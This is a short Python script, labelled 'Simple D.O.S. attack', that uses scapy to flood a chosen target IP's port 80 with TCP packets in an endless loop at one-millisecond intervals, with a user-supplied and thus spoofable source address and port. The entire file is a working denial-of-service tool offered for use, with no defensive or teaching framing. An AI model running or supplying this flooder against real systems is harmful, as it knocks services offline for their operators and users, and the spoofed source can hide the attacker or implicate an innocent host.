#!/usr/bin/python3
from scapy.all import *
import argparse

parser = argparse.ArgumentParser(description="Simple D.O.S. attack")
parser.add_argument("-s", "--source", dest="src", help="Source IP", required=True)
parser.add_argument("-t", "--target", dest="target", help="Target IP", required=True)
parser.add_argument("-p", "--port", dest="port", help="Source port", required=True)
arguments = parser.parse_args()

packages = 1

while True:
    IP1 = IP(src=arguments.src, dst=arguments.target)
    TCP1 = TCP(sport=int(arguments.port), dport=80)
    package = IP1 / TCP1    #make package
    send(package, inter=.001)   #inter: time interval to wait between two packages
    print("Number of packages: ", packages)
    packages += 1
